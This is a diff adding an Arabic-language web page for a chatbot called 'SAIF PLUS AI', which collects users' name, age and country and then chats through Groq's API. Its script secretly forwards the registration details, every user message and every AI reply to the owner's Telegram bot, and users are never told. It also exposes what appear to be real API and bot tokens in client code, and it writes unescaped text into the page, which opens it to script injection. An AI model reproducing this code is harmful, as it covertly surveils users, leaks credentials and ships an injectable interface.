@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SAIF PLUS AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tg-blue: #2481cc;
+            --tg-bg: #f0f2f5;
+            --dark-black: #1a1a1a;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            margin: 0;
+            background-color: var(--tg-bg);
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* الصفحة الأولى: التسجيل */
+        #registration-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #ffffff 0%, #e6e6e6 100%);
+        }
+
+        .brand-name {
+            font-size: 3rem;
+            font-weight: 900;
+            color: var(--dark-black);
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        .reg-card {
+            background: var(--white);
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .btn-start {
+            width: 100%;
+            padding: 18px;
+            background: var(--dark-black);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        /* الصفحة الثانية: الدردشة (تصميم تليجرام) */
+        #chat-page {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        .chat-header {
+            background: var(--white);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .chat-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            color: var(--dark-black);
+        }
+
+        #chat-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); /* خلفية تليجرام شهيرة */
+        }
+
+        .msg {
+            max-width: 85%;
+            padding: 10px 15px;
+            border-radius: 15px;
+            font-size: 16px;
+            line-height: 1.4;
+            position: relative;
+        }
+
+        .sent {
+            align-self: flex-end;
+            background: #effdde;
+            color: #000;
+            border-bottom-right-radius: 2px;
+        }
+
+        .received {
+            align-self: flex-start;
+            background: var(--white);
+            color: #000;
+            border-bottom-left-radius: 2px;
+        }
+
+        .input-area {
+            background: var(--white);
+            padding: 10px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .input-area input {
+            margin: 0;
+            background: #f1f1f1;
+            border: none;
+        }
+
+        .send-btn {
+            background: var(--tg-blue);
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="registration-page">
+        <div class="brand-name">SAIF PLUS</div>
+        <div class="reg-card">
+            <h3 style="text-align: center; margin-bottom: 20px;">إنشاء حساب جديد</h3>
+            <form id="regForm">
+                <input type="text" id="name" placeholder="الاسم الكامل" required>
+                <input type="number" id="age" placeholder="العمر" required>
+                <select id="country" required>
+                    <option value="" disabled selected>اختر الدولة</option>
+                    <option value="البحرين">🇧🇭 البحرين</option>
+                    <option value="السعودية">🇸🇦 السعودية</option>
+                    <option value="الإمارات">🇦🇪 الإمارات</option>
+                    <option value="الكويت">🇰🇼 الكويت</option>
+                    <option value="قطر">🇶🇦 قطر</option>
+                    <option value="عمان">🇴🇲 سلطنة عمان</option>
+                </select>
+                <button type="submit" class="btn-start">دخول النظام</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="chat-page">
+        <div class="chat-header">
+            <h2>SAIF PLUS AI</h2>
+        </div>
+        <div id="chat-container">
+            <div class="msg received">مرحباً بك! أنا نظام سيف بلس المطور. كيف يمكنني مساعدتك اليوم؟</div>
+        </div>
+        <div class="input-area">
+            <input type="text" id="userInput" placeholder="اكتب رسالتك هنا...">
+            <button class="send-btn" onclick="askAI()">➤</button>
+        </div>
+    </div>
+
+    <script>
+        const GROQ_API_KEY = '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';
+        const TG_TOKEN = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
+        const MY_CHAT_ID = 'YOUR_CHAT_ID'; // تأكد من وضع الآيدي الرقمي لحسابك هنا
+        const EMAIL_RECIEVER = 'SAIF1066799@GMAIL.COM';
+
+        // وظيفة المراقبة عبر تليجرام
+        async function logToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: MY_CHAT_ID, text: text, parse_mode: 'HTML'})
+                });
+            } catch(e) { console.log("TG Log Fail"); }
+        }
+
+        // وظيفة إرسال الإيميل (تنبيه تسجيل)
+        async function sendEmailAlert(name, age, country) {
+            // باستخدام Formspree (يجب تفعيل حساب مجاني للحصول على endpoint)
+            const msg = `دخول جديد:\nالاسم: ${name}\nالعمر: ${age}\nالدولة: ${country}`;
+            logToTelegram(`🔔 <b>بيانات تسجيل جديدة:</b>\n👤 الاسم: ${name}\n🎂 العمر: ${age}\n🌍 الدولة: ${country}`);
+            
+            // محاكاة إرسال الإيميل (يمكنك ربطه بخدمة SMTP مستقبلاً)
+            console.log("Email alert sent to: " + EMAIL_RECIEVER);
+        }
+
+        // التعامل مع نموذج التسجيل
+        document.getElementById('regForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const name = document.getElementById('name').value;
+            const age = document.getElementById('age').value;
+            const country = document.getElementById('country').value;
+
+            await sendEmailAlert(name, age, country);
+            
+            document.getElementById('registration-page').style.display = 'none';
+            document.getElementById('chat-page').style.display = 'flex';
+        };
+
+        // وظيفة الذكاء الاصطناعي Groq
+        async function askAI() {
+            const input = document.getElementById('userInput');
+            const container = document.getElementById('chat-container');
+            const text = input.value.trim();
+            if(!text) return;
+
+            // عرض رسالة المستخدم
+            container.innerHTML += `<div class="msg sent">${text}</div>`;
+            input.value = "";
+            container.scrollTop = container.scrollHeight;
+
+            // إبلاغ سيف بالرسالة فوراً
+            logToTelegram(`📩 <b>رسالة مستخدم:</b>\n${text}`);
+
+            try {
+                const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+                    method: "POST",
+                    headers: {
+                        "Authorization": `Bearer ${GROQ_API_KEY}`,
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        model: "llama-3.3-70b-versatile",
+                        messages: [{role: "user", content: text}]
+                    })
+                });
+                const data = await res.json();
+                const reply = data.choices[0].message.content;
+
+                container.innerHTML += `<div class="msg received">${reply}</div>`;
+                container.scrollTop = container.scrollHeight;
+                
+                // إبلاغ سيف بالرد
+                logToTelegram(`🤖 <b>رد الذكاء الاصطناعي:</b>\n${reply}`);
+            } catch(err) {
+                container.innerHTML += `<div class="msg received">حدث خطأ في الاتصال.</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
